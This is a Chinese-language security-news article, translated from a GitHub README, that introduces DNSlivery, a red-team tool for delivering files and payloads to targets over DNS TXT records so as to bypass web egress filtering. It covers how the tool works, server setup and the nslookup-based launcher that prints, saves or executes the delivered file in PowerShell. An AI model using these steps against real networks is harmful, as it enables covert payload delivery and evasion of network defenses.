**DNSlivery项目允许通过DNS协议将文件和Payload投递到目标上。该项目最初的灵感来自于[PowerDNS](https://github.com/mdsecactivebreach/PowerDNS)和[Joff
Thyer](https://twitter.com/joff_thyer)发布在Paul[每周安全播客#590的技术片段](http://youtu.be/CP6cIwFJswQ)。**

## 特性

> 允许打印，执行或保存文件到目标
>
> 不需要目标上的任何客户端
>
> 不需要完整的DNS服务器

![DNSlivery](https://image.3001.net/images/20190225/1551057348_5c7341c46d347.png!small)

DNSlivery可以轻松地将文件/payload传送到目标机器，且不需要目标上安装运行任何专用的客户端软件，这是web
delivery无法做到的地方。这非常适用于禁止传出Web流量或仅通过网络代理进行检查的受限环境。

![web-delivery-blocked.png](https://image.3001.net/images/20190225/1551057370_5c7341da2e6b3.png!small)

即使已存在更为完整的DNS隧道工具（如，[dnscat2](https://github.com/iagox86/dnscat2)和[iodine](https://code.kryo.se/iodine/)），它们都需要在目标上运行专用客户端。问题是DNS可能并没有办法在这种受限的环境中提供客户端。换句话说，使用这些工具构建DNS信道需要已建立DNS信道。

相比之下，DNSlivery仅提供从服务器到目标的单向通信，但不需要任何专用客户端来执行此操作。因此，如果你需要通过DNS构建可靠的双向信道，请使用DNSlivery投递一个更高级的DNS隧道工具到你的目标。

## 工作原理

与大多数DNS隧道工具一样，DNSlivery使用TXT记录并以base64表示形式存储文件内容。然而，它不需要设置完整的DNS服务器，它使用[scapy](https://scapy.net/)库来侦听传入的DNS数据包以及响应。

![network-process.png](https://image.3001.net/images/20190225/1551057387_5c7341eb40ef9.png!small)

由于大多数文件不适合单个TXT记录，DnsLivery将创建包含base64
chunk文件的多个有序记录。作为一个例子，上图说明了名为file的文件的第42个chunk的传递。

为了检索所有base64 chunk并将它们重新组合在一起而不需要目标上的专用客户端，DnsLivery将为每个文件生成：

> 一个简单的明文 launcher
>
> 一个可靠的base64编码stager

![two-stages-delivery.png](https://image.3001.net/images/20190225/1551057408_5c73420035ce7.png!small)

需要这两个阶段的投递过程来向stager添加功能（s.a.处理丢失的DNS响应），否则这些功能将不适合单个TXT记录。

## 关于目标兼容性

目前，仅支持PowerShell。但是，可以通过改进DNSlivery使其支持其他目标，如bash或python。如果这是你希望实现的功能，请告诉我[@no0be](https://twitter.com/no0be)。

## 安装要求

DNSlivery不需要构建复杂的服务器架构。实际上，你只需满足以下两个简单的要求即可：

> 能够在你的公共DNS区域中创建NS记录
>
> 拥有一台能够从Internet接收udp/53流量的Linux服务器

## 设置

###  **DNS Zone**

第一步是通过在域中创建新的NS记录，将子域委派给将运行DNSlivery的服务器。例如，我创建了以下记录，将子域dnsd.no0.be委派给服务器vps.no0.be.

    
    
    dnsd    IN  NS vps.no0.be.

如果你的区域由第三方提供商管理，请参阅其文档以创建NS记录。

###  **DNSlivery**

运行DNSlivery的唯一要求是python3及其scapy库。

    
    
    git clone https://github.com/no0be/DNSlivery.git && cd DNSlivery
    pip install -r requirements.txt

## 使用

###  **Server**

DNSlivery将提供给定目录的所有文件（默认为pwd），并且需要以root权限运行以侦听传入的udp/53数据包。

    
    
    usage: dnslivery.py [-h] [-p PATH] [-s SIZE] [-v] interface domain nameserver
    
    DNSlivery - Easy files and payloads delivery over DNS
    
    positional arguments:
      interface             interface to listen to DNS traffic
      domain                FQDN name of the DNS zone
      nameserver            FQDN name of the server running DNSlivery
    
    optional arguments:
      -h, --help            show this help message and exit
      -p PATH, --path PATH  path of directory to serve over DNS (default: pwd)
      -s SIZE, --size SIZE  size in bytes of base64 chunks (default: 255)
      -v, --verbose         increase verbosity

示例：

    
    
    $ sudo python3 dnslivery.py eth0 dnsd.no0.be vps.no0.be -p /tmp/dns-delivery
    
    DNSlivery - Easy files and payloads delivery over DNS
    
    [*] File "file" ready for delivery at file.dnsd.no0.be (7 chunks)
    [*] Listening for DNS queries...

###  **关于文件名规范化**

由于域名允许的字符集比UNIX文件名更具限制性（根据[RFC1035](https://tools.ietf.org/html/rfc1035#section-2.3.1)），因此DNSlivery将在需要时执行规范化。

示例：

    
    
    [*] File "My Awesome Powershell Script ;).ps1" ready for delivery at my-awesome-powershell-script----ps1.dnsd.no0.be (1891 chunks)

注意，当前的规范化代码并不完美，因为它不会考虑文件名重叠或大小限制。

## Target

在目标上，首先通过请求其专用TXT记录来检索所需文件的launcher。支持以下三个launcher：

行为 | Launcher | 描述  
---|---|---  
打印 | [filename].print.[domain] | （ **默认** ）将传送的文件打印到控制台  
执行 | [filename].exec.[domain] | 执行传送的文件（对脚本有用）  
保存 | [filename].save.[domain] | 将传送的文件保存到磁盘（对二进制文件很有用）  
      
    
    nslookup -type=txt [filename].[stager].[domain]

然后，只需将DNS响应中引用的launcher复制并粘贴到PowerShell控制台即可检索目标上的文件。

示例：

![DNSlivery](https://image.3001.net/images/20190225/1551057433_5c7342199e5b8.png!small)

 ***参考来源：[GitHub](https://github.com/no0be/DNSlivery#what-problem-are-you-trying-to-solve)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

